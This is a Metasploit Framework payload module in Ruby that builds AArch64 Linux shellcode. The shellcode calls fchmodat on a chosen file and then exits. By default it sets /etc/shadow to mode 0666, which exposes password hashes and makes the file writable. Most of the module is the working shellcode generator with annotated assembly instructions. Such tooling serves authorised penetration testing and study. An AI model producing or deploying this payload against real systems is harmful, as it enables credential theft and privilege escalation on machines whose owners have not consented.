##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 48

  include Msf::Payload::Single
  include Msf::Payload::Linux::Aarch64::Prepends

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Chmod',
        'Description' => 'Runs chmod on the specified file with specified mode.',
        'Author' => 'bcoles',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_AARCH64,
        'References' => [
          ['URL', 'https://man7.org/linux/man-pages/man2/fchmodat.2.html'],
          ['URL', 'https://github.com/bcoles/shellcode/blob/main/aarch64/chmod/chmod.s'],
        ]
      )
    )
    register_options([
      OptString.new('FILE', [ true, 'Filename to chmod', '/etc/shadow' ]),
      OptString.new('MODE', [ true, 'File mode (octal)', '0666' ]),
    ])
  end

  # @return [String] the full path of the file to be modified
  def chmod_file_path
    datastore['FILE'] || ''
  end

  # @return [Integer] the desired mode for the file
  def mode
    (datastore['MODE'] || '0666').oct
  rescue StandardError => e
    raise ArgumentError, "Invalid chmod mode '#{datastore['MODE']}': #{e.message}"
  end

  # @return [Integer] AArch64 instruction to load mode into x2 register
  # For example: 0xd28036c2 ; mov x2, #0x1b6 ; loads 0x1b6 (0o666) into x2
  def chmod_instruction(mode)
    (0xd2800000 | ((mode & 0xffff) << 5) | 2)
  end

  def generate(_opts = {})
    raise ArgumentError, "chmod mode (#{mode}) is greater than maximum mode size (0x7FF)" if mode > 0x7FF

    shellcode = [
      0x92800c60, # mov x0, #0xffffffffffffff9c // #-100
      0x10000101, # adr x1, 40009c <path>
      chmod_instruction(mode), # mov x2, <mode>
      0xd2800003, # mov x3, #0
      0xd28006a8, # mov x8, #0x35 # __NR_fchmodat
      0xd4000001, # svc #0
      0xd2800000, # mov x0, #0
      0xd2800ba8, # mov x8, #0x5d # __NR_exit
      0xd4000001  # svc #0
    ].pack('V*')
    shellcode += chmod_file_path + "\x00"

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
